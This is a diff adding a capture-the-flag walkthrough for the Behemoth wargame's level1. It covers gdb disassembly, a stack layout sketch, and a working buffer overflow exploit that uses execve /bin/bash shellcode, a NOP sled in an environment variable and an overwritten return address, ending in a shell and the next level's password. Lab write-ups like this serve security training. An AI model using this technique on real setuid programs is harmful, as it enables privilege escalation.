@@ -57,6 +57,158 @@ aesebootiv
 
 ## level1-level2
 
+**test the process** 
+
+It shows we need to input a passwd word, so we tried to input something and got a "authentication failure"  
+
+**take a look at the dissemble** 
+
+```assembly
+(gdb) disas main 
+
+Dump of assembler code for function main: 
+   0x0804844b <+0>: push   %ebp 
+   0x0804844c <+1>: mov    %esp,%ebp 
+   0x0804844e <+3>: sub    $0x44,%esp 
+   0x08048451 <+6>: push   $0x8048500 
+   0x08048456 <+11>: call   0x8048300 <printf@plt> 
+   0x0804845b <+16>: add    $0x4,%esp 
+   0x0804845e <+19>: lea    -0x43(%ebp),%eax 
+   0x08048461 <+22>: push   %eax 
+   0x08048462 <+23>: call   0x8048310 <gets@plt> 
+   0x08048467 <+28>: add    $0x4,%esp 
+   0x0804846a <+31>: push   $0x804850c 
+   0x0804846f <+36>: call   0x8048320 <puts@plt> 
+   0x08048474 <+41>: add    $0x4,%esp 
+   0x08048477 <+44>: mov    $0x0,%eax 
+   0x0804847c <+49>: leave 
+   0x0804847d <+50>: ret 
+End of assembler dump.
+```
+
+let us take a lool at the stack:
+
+\-----------------------------
+
+| return add 4 bytes | 
+
+\---------------------------- 
+
+| old esp 4 bytes	|       push   %ebp  
+
+----------------------       mov    %esp,%ebp 
+
+|                    			| 
+
+|                  		  	|       0x43 
+
+|               	  	   	| 
+
+|     input     	     	| 
+
+----------------------       sub    $0x44,%esp 
+
+| call gets     	  	| 
+
+\---------------------- 
+
+So what is the size of the overwrite area??  
+
+**try stack overflow** 
+
+```shell
+behemoth1@behemoth:/behemoth$ python -c "print 'A'*71" | ./behemoth1 
+Password: Authentication failure. 
+Sorry. 
+Segmentation fault 
+```
+
+**find shellcode** 
+
+ No we know that it must have some stack overflow, so we can find some shellcode to inject in somewhere of the system. And find the address of my shellcode just input into the return region of behemoth1 process. 
+
+ ```shell
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80 
+ ```
+
+From: http://shell-storm.org/shellcode/files/shellcode-606.php  
+
+**insert our shellcode** 
+
+ There are many ways to insert our shellcode into the system, just make sure the place you insert can be executed. Maybe the Environment, or just in the 0x43 regions. 
+
+ 
+
+So I just export the shellcode as an environment named CODE: 
+
+```shell
+export CODE=$(python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') 
+```
+
+**find where your shellcode is** 
+
+ For now, we have the shellcode in the environment, the address often fix at the time you login. But if you logout and login again, the value of the environment will change. 
+
+ ```shell
+(gdb) ./behemoth1 
+(gdb) b *main+23 
+(gdb) r 
+You will stop at your breakpoint, now you can find the address of CODE environment 
+(gdb) x/s *((char **)environ+offset) 
+0xffffde5d:    "CODE=", '\220' <repeats 100 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀" 
+ ```
+
+So now, you have the address of your shellcode: 0xffffde5d. You just need to insert this address into the return address. 
+
+**put your shellcode into the local region** 
+
+ (gdb) r <<< $(python -c 'print "A"*71+"\x90"*100') 
+
+Find the address you want ti insert into this stack:  
+
+python -c "print 'A'\*71 + '\x64\xd6\xff\xff' + '\x90'\*16 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'"  > test 
+
+(cat test; cat) | /behemoth/behemoth1 
+
+**change the return address and run our shellcode!** 
+
+behemoth1@behemoth:/behemoth$ python -c "print 'A'*71" | ./behemoth1 
+
+Password: Authentication failure. 
+
+Sorry. 
+
+Segmentation fault 
+
+whoami 
+
+behemoth2 
+
+cat /etc/behemoth_pass/behemoth2 
+
+eimahquuof 
+
+ 
+
+
+
+Congratulations! You got the passwd! 
+
+ 
+
+*****************
+
+There are something we need to know: 
+
+1. The size of the input region in the stack we need to make sure. 
+2. The shellcode must fit to our system, the path of bash, the 32-bit or 64-bit.
+
+
+
+
+
+
+
 behemoth2: eimahquuof
 
 ## level2-level3
@@ -431,3 +583,4 @@ mayiroeche
 ```
 
 use udp protocol to create the socket connection.
+
